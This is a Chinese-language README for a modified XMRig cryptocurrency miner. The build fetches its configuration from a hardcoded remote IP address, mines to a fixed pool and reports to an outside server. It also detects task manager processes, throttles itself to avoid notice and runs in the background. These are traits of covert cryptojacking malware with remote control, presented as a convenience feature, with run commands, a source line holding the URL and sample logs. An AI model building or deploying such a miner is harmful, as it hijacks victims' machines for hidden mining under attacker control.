# XMRig 自动远程配置功能

## ✅ 功能实现

程序现在可以**完全自动**从远程服务器获取配置，无需任何本地配置文件或命令行参数。

### 核心特性

1. **零配置启动** - 直接运行 `./xmrig` 即可，无需任何参数
2. **自动获取配置** - 默认从 `http://182.92.97.16:8181/configs/666+cpu.json` 获取配置
3. **无需本地文件** - 不需要 config.json 或任何本地配置文件
4. **同步加载** - 确保配置加载完成后再开始挖矿

## 🚀 使用方法

### 最简单的使用方式
```bash
# 直接运行，无需任何参数
./xmrig
```

### 其他运行方式
```bash
# 测试模式（不实际挖矿）
./xmrig --dry-run

# 后台运行
./xmrig -B

# 指定日志文件
./xmrig --log-file=xmrig.log
```

## 📝 工作流程

1. 程序启动
2. 检查本地配置文件（可选）
3. 如果没有本地配置，自动使用默认远程配置URL
4. 从 `http://182.92.97.16:8181/configs/666+cpu.json` 获取配置
5. 应用远程配置
6. 开始挖矿

## 🔧 技术实现

### 修改的文件
- `src/App.cpp` - 移除了配置检查，允许无配置启动
- `src/base/kernel/Base.cpp` - 创建默认空配置对象
- `src/core/config/Config.cpp` - 添加默认远程配置URL
- `src/core/config/WebConfigFetcher.cpp` - 添加同步配置获取方法

### 默认远程配置URL
```cpp
const char* DEFAULT_WEB_CONFIG_URL = "http://182.92.97.16:8181/configs/666+cpu.json";
```

## 📊 远程配置内容

服务器返回的配置包含：
- 矿池地址：`38.55.195.81:10002`
- 算法：`rx/0` (RandomX)
- CPU设置：70%线程使用率
- 系统监控：CPU高于95%暂停，低于30%恢复
- 进程检测：检测任务管理器等进程
- 上报服务器：`serveris.lieshoubbs.com:8181`

## ⚙️ 配置优先级

1. **命令行参数** （最高优先级）
2. **本地配置文件** （如果存在）
3. **远程配置** （默认）

## 🔒 安全说明

- 程序会自动信任远程服务器的配置
- 建议在受控环境中使用
- 可以通过防火墙限制对配置服务器的访问

## 📝 日志输出示例

```
[2025-08-15 01:37:32.003] No local configuration found, will fetch from remote server
[2025-08-15 01:37:32.003] Using default web configuration URL: http://182.92.97.16:8181/configs/666+cpu.json
[2025-08-15 01:37:32.003] Loading configuration from: http://182.92.97.16:8181/configs/666+cpu.json
[2025-08-15 01:37:32.466] Successfully fetched and parsed configuration
[2025-08-15 01:37:32.466] Applying web configuration
[2025-08-15 01:37:32.466] Web configuration applied successfully
```

## ✅ 测试验证

### 测试环境
- 操作系统：Linux (Ubuntu)
- 编译器：Clang 20.1.2
- 测试时间：2025-08-15

### 测试结果
- ✅ 无配置文件启动：**成功**
- ✅ 自动获取远程配置：**成功**
- ✅ 应用远程配置：**成功**
- ✅ 开始挖矿：**正常**

## 🎯 总结

现在XMRig可以：
1. **无需任何本地配置文件**
2. **无需任何命令行参数**
3. **自动从远程服务器获取所有配置**
4. **直接运行 `./xmrig` 即可开始挖矿**

远程配置服务器地址已硬编码为：`http://182.92.97.16:8181/configs/666+cpu.json`